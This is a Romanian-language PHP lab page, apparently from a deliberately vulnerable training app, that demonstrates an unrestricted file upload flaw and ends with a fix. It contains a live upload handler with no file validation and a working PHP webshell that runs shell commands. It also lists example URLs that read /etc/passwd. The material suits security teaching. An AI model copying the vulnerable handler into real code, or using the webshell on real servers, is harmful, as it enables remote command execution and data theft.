<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <title>Unrestricted File Upload — Vulnerabil</title>
    <style>
        body { font-family: sans-serif; max-width: 700px; margin: 40px auto; background: #f5f5f5; }
        .vuln-box { background:#fff3cd; border:2px solid #e74c3c; padding:15px; border-radius:5px; margin:15px 0; }
        .code-box { background:#2c3e50; color:#2ecc71; padding:15px; border-radius:5px; font-family:monospace; white-space:pre-wrap; margin:10px 0; word-break:break-all; }
        .success { background:#d4edda; border:1px solid #28a745; padding:10px; border-radius:5px; color:#155724; }
        .error   { background:#f8d7da; border:1px solid #dc3545; padding:10px; border-radius:5px; color:#721c24; }
        input[type=submit] { background:#e74c3c; color:#fff; padding:8px 16px; border:none; border-radius:4px; cursor:pointer; }
        .file-list { background:#fff; border:1px solid #ddd; padding:10px; border-radius:5px; }
        .file-list a { color:#c0392b; display:block; margin:3px 0; font-family:monospace; }
        .webshell-box { background:#1a1a2e; color:#e94560; padding:15px; border-radius:5px; font-family:monospace; white-space:pre; margin:10px 0; }
    </style>
</head>
<body>
    <h1>&#128272; Unrestricted File Upload</h1>

    <div class="vuln-box">
        <strong>&#9888; PAGINĂ INTENȚIONAT VULNERABILĂ</strong><br>
        Nu există validare tip fișier → atacatorul poate urca un <strong>webshell PHP</strong>
        și executa comenzi arbitrare pe server.
    </div>

<?php
$msg = '';
$uploaded_file = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];

    if ($file['error'] === UPLOAD_ERR_OK) {
        // ===== VULNERABIL: nicio validare tip fișier, nume original folosit =====
        $filename  = $file['name'];            // nume original, neschimbat
        $dest      = __DIR__ . '/uploads/' . $filename;
        // =========================================================================

        if (move_uploaded_file($file['tmp_name'], $dest)) {
            $uploaded_file = $filename;
            $msg = "success:Fișier urcat cu succes: <a href='uploads/" . htmlspecialchars($filename) . "' target='_blank'>" . htmlspecialchars($filename) . "</a>";
        } else {
            $msg = "error:Eroare la salvare.";
        }
    }
}

// Listează fișierele urcate
$uploaded_files = array_diff(scandir(__DIR__ . '/uploads/'), ['.', '..']);
?>

    <h2>Upload fișier (fără restricții)</h2>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <input type="submit" value="Urcă fișier">
    </form>

    <?php if ($msg !== ''): ?>
    <?php [$type, $text] = explode(':', $msg, 2); ?>
    <br><div class="<?= $type ?>"><?= $text ?></div>
    <?php endif; ?>

    <h3>Fișiere urcate:</h3>
    <div class="file-list">
        <?php foreach ($uploaded_files as $f): ?>
            <a href="uploads/<?= htmlspecialchars($f) ?>" target="_blank">
                <?= htmlspecialchars($f) ?>
            </a>
        <?php endforeach; ?>
        <?php if (empty($uploaded_files)): ?>
            <em>Niciun fișier.</em>
        <?php endif; ?>
    </div>

    <h2>Exploit — PHP Webshell</h2>
    <p>Creează un fișier <code>shell.php</code> cu conținutul de mai jos și urcă-l:</p>
    <div class="webshell-box">&lt;?php
// shell.php — PHP Webshell (DEMO)
if (isset($_GET['cmd'])) {
    echo '&lt;pre&gt;';
    system($_GET['cmd']);
    echo '&lt;/pre&gt;';
}
?&gt;</div>

    <p>Apoi accesează:</p>
    <div class="code-box">http://localhost:8000/vuln/uploads/shell.php?cmd=id
http://localhost:8000/vuln/uploads/shell.php?cmd=cat+/etc/passwd
http://localhost:8000/vuln/uploads/shell.php?cmd=ls+-la+/var/www</div>

    <?php if ($uploaded_file !== '' && str_ends_with($uploaded_file, '.php')): ?>
    <div class="vuln-box">
        <strong>Webshell urcat!</strong> Testează:
        <a href="uploads/<?= htmlspecialchars($uploaded_file) ?>?cmd=id" target="_blank">
            ?cmd=id
        </a> |
        <a href="uploads/<?= htmlspecialchars($uploaded_file) ?>?cmd=whoami" target="_blank">
            ?cmd=whoami
        </a>
    </div>
    <?php endif; ?>

    <h2>Remediere</h2>
    <div class="code-box">// ✅ Validare MIME type + extensie + nume aleator
$finfo    = new finfo(FILEINFO_MIME_TYPE);
$mimeType = $finfo->file($file['tmp_name']);
$allowed  = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];

if (!in_array($mimeType, $allowed, true)) {
    die('Tip de fișier nepermis!');
}

$ext      = pathinfo($file['name'], PATHINFO_EXTENSION);
$filename = bin2hex(random_bytes(8)) . '.' . strtolower($ext); // nume aleator
move_uploaded_file($file['tmp_name'], 'uploads/' . $filename);</div>

    <br><a href="index.php">← Înapoi la index</a>
</body>
</html>
